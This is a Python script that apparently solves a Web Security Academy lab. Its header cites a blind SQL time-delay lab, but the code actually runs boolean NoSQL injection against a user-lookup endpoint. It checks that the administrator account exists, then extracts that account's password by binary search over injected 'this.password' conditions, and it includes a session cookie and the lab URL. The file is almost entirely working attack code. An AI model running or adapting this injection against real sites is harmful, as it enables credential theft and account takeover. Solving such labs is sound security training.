# https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval#

import requests
import time

username = "administrator"
ascii_wordlist = list(range(32, 127))
response_timeout = 10

url =  "https://0a9500f90351517880f60827004200ad.web-security-academy.net:443/"
headers = {"Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Sec-Ch-Ua-Mobile": "?0", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://0a9500f90351517880f60827004200ad.web-security-academy.net/my-account?id=wiener", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=1, i"}
session = "lhJnGJSuwtorAjFoiforXdb5wIq76iiZ"

def exists_user(username: str) -> bool:
    cookies = {"session": session}
    response = requests.get(url + f"/user/lookup?user={username}", headers=headers, cookies=cookies)
    return f"{username}" in response.text

def password_length_is_greater_than(username: str, index: int) -> int:
    injected_query = f"{username}' && this.password.length > {index} && 'a'=='a"
    print(f"{injected_query}")
    cookies = {"session": session}
    response = requests.get(url + f"/user/lookup", headers=headers, cookies=cookies, params={"user": injected_query})
    print(response.text)
    return f"{username}" in response.text

def character_is_greater_than(username: str, character: str, index: int) -> bool:
    injected_query = f"{username}' && this.password[{index}] > '{character}' && 'a'=='a"
    cookies = {"session": session}
    response = requests.get(url + f"/user/lookup", headers=headers, cookies=cookies, params={"user": injected_query})
    return f"{username}" in response.text

def binary_search(values, is_greater_than):
    low = 0
    high = len(values) - 1

    while low < high:
        mid = (low + high) // 2

        if is_greater_than(values[mid]):
            low = mid + 1
        else:
            high = mid

    return values[low]

if not exists_user(username):
    print(f"User {username} does not exist")
    exit()
print(f"User {username} exists")

length = binary_search(range(1, 40), lambda x: password_length_is_greater_than(username, x))
print(f"Password length: {length}")

password = ""
for index in range(0, length):
    print(f"Index: {index}")
    character = binary_search(ascii_wordlist, lambda x: character_is_greater_than(username, chr(x), index))
    print(f"Character: {chr(character)}")
    password += chr(character)
    print(f"Password: {password}")
